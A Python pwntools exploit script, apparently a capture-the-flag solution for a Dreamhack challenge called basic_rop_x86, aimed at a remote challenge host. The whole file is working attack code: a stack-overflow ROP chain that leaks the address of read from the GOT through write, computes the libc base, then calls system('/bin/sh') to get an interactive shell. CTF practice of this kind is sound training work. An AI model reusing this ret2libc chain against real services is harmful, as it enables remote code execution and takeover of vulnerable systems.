#!/usr/bin/env python3

from pwn import *

exe = ELF("./basic_rop_x86_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 9286)

    return r


def main():
    r = conn()

    rop = ROP(exe)
    pop3_ret = rop.find_gadget(["pop esi", "pop edi", "pop ebp", "ret"])[0]

    payload = b"A" * 0x48                   # from buf to ebp
    payload += p32(exe.plt["write"])        # write@PLT
    payload += p32(pop3_ret)                # pop esi; pop edi; pop ebp; ret
    payload += p32(1)                       # stdout
    payload += p32(exe.got["read"])         # read@GOT
    payload += p32(4)                       # 4 byte
    payload += p32(exe.symbols["main"])     # main:0

    r.send(payload)

    r.recvn(0x40)    
    
    read_va = u32(r.recvn(4))
    libc_base = read_va - libc.symbols["read"]
    system_va = libc_base + libc.symbols["system"]
    binsh_va = libc_base + list(libc.search(b"/bin/sh"))[0]
    
    pop1_ret = rop.find_gadget(["pop ebx", "ret"])[0]

    payload = b"A" * 0x48                   # from buf to ebp
    payload += p32(system_va)               # system("/bin/sh")
    payload += p32(pop1_ret)                # pop ebx; ret
    payload += p32(binsh_va)                # "/bin/sh"

    r.send(payload)

    r.interactive()


if __name__ == "__main__":
    main()
